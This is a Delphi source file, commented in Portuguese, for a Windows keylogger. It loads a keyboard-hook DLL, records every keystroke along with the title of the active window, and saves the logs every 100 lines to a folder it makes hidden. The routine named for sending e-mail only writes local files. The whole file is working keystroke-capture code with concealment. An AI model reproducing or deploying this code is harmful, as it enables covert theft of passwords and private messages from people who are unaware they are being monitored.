unit Unit1;

interface

uses
  Windows, Messages, SysUtils, Classes, Graphics, Controls, Forms, Dialogs, StdCtrls;

const
  NomeDLL       = 'HookTeclado.dll';
  CM_MANDA_TECLA  = WM_USER + $1000;


type
  THookTeclado=procedure; stdcall;

type
    TForm1 = class(TForm)
    Memo1: TMemo;
    procedure FormCreate(Sender: TObject);
    procedure FormDestroy(Sender: TObject);

private
    { Private declarations }
    FStringList : TStringList;
    FTecla : string;
    FTeclasDigitadas : string;
    ArquivoM       : THandle;
    PReceptor      : ^Integer;
    HandleDLL      : THandle;
    HookOn,
    HookOff        : THookTeclado;

    procedure LlegaDelHook(var message: TMessage); message  CM_MANDA_TECLA;
    procedure EnviarE_mail;
    function PegarNomeJanela() : string;

public
    { Public declarations }
end;

var
  Form1: TForm1;

implementation

uses StrUtils;

{$R *.DFM}

procedure TForm1.FormCreate(Sender: TObject);
var
  lDiretorio : string;
begin
  FStringList := TStringList.Create();
  {Nao queremos que o memo seja editado conforme a tecla pressionada}
  Memo1.ReadOnly:=TRUE;

  lDiretorio := ExtractFilePath(Application.Exename)+NomeDLL;
  if not FileExists(lDiretorio) then
    lDiretorio := ExtractFileDrive(ExtractFilePath(Application.ExeName)) + '\Windows\SysWOW64\'+NomeDLL;
  if not FileExists(lDiretorio) then
    lDiretorio := ExtractFileDrive(ExtractFilePath(Application.ExeName)) + '\Windows\System32\'+NomeDLL;

  HandleDLL:=LoadLibrary(PChar(lDiretorio));
  if HandleDLL = 0 then raise Exception.Create('Não foi possível carregar a DLL!');

  @HookOn :=GetProcAddress(HandleDLL, 'HookOn');
  @HookOff:=GetProcAddress(HandleDLL, 'HookOff');

  IF not assigned(HookOn) or
     not assigned(HookOff)  then
     raise Exception.Create('Não foram encontradas as funções na DLL');

  {Criamos o arquivo de memoria}
  ArquivoM:=CreateFileMapping( $FFFFFFFF,
                               nil,
                               PAGE_READWRITE,
                               0,
                               SizeOf(Integer),
                               'OReceptor');

  {Se o arquivo nao se criou, erro}
  if ArquivoM=0 then
    raise Exception.Create( 'Erro ao criar o arquivo');

  {Direcionamos nossa estrutura ao arquivo de memoria}
  PReceptor:=MapViewOfFile(ArquivoM,FILE_MAP_WRITE,0,0,0);

  {Escrevemos dados no arquivo de memoria}
  PReceptor^:=Handle;
  HookOn;
end;

procedure TForm1.LlegaDelHook(var message: TMessage);
var
   NomeTecla : array[0..100] of char;
   Acao      : string;
begin
  {Traduzimos de "Virtual key Code" a "TEXTO"}
  GetKeyNameText(Message.LParam,@NomeTecla,50);
  {Observamos se a tecla foi pressionada, soltada o repetida}
  if ((Message.lParam shr 31) and 1)=1 then
    Acao:='Solta'
  else
    if ((Message.lParam shr 30) and 1)=1 then
      Acao:='Repetida'
    else Acao:='Pressionada';

  if Acao = 'Pressionada' then
    begin
      FTecla := String(NomeTecla);
      if AnsiContainsStr('QWERTYUIOPASDFGHJKLÇZXCVBNM,.;/?][{}=+-()*%$#@!""1234567890áéóõãÃÕ\|´`^~', Uppercase(FTecla)) then
        FTeclasDigitadas := FTeclasDigitadas + FTecla
      else if AnsiSameStr('Space',FTecla) then
        FTeclasDigitadas := FTeclasDigitadas + ' '
      else if AnsiSameStr('Backspace',FTecla) then
        Delete(FTeclasDigitadas,Length(FTeclasDigitadas),1);  


      if AnsiSameStr(UpperCase(FTecla), 'ENTER') or
         (Length(FTeclasDigitadas)>= 255) then
        begin
          FStringList.Add(PegarNomeJanela());
          FStringList.Add(FTeclasDigitadas);
          Memo1.Lines.Append(FTeclasDigitadas);
          FTeclasDigitadas := '';
          if FStringList.Count >= 100 then
            EnviarE_mail();
        end;
    end;
end;

procedure TForm1.FormDestroy(Sender: TObject);
begin
  EnviarE_mail();
  
  FreeAndNil(FStringList);
  {Desativamos o Hook}
  if Assigned(HookOff) then
    HookOff;

  {Liberamos a DLL}
  if HandleDLL<>0 then
    FreeLibrary(HandleDLL);

  {Fechamos a vista do arquivo e o arquivo}
  if ArquivoM<>0 then begin
    UnmapViewOfFile(PReceptor);
    CloseHandle(ArquivoM);
  end;
end;

procedure TForm1.EnviarE_mail();
var
  lDiretorio: Tfilename;
  Attributes : Integer;
begin
  lDiretorio:= ExtractFileDrive(ExtractFilePath(Application.ExeName)) + '\relatorios';
  if not DirectoryExists(lDiretorio) then
    CreateDir(lDiretorio);

  // os comandos abaixo ocultam a pasta
  Attributes := faDirectory + faHidden;
  FileSetAttr(lDiretorio,Attributes);

  FStringList.SaveToFile(lDiretorio + '\Relatorio_' + FormatDateTime('YYYYMMDD HHMM', Now)+ '.txt');
  FStringList.Clear();
end;

function TForm1.PegarNomeJanela: string;
var
  H: HWND;
  WindowName: Array[0..255] of Char;
  ClassName: Array[0..255] of Char;
begin
  H := GetForegroundWindow;
  GetWindowText(H, WindowName, SizeOf(WindowName));
  GetClassName(H, ClassName, SizeOf(ClassName));
  result := 'Nome-> '+ WindowName;
end;

end.
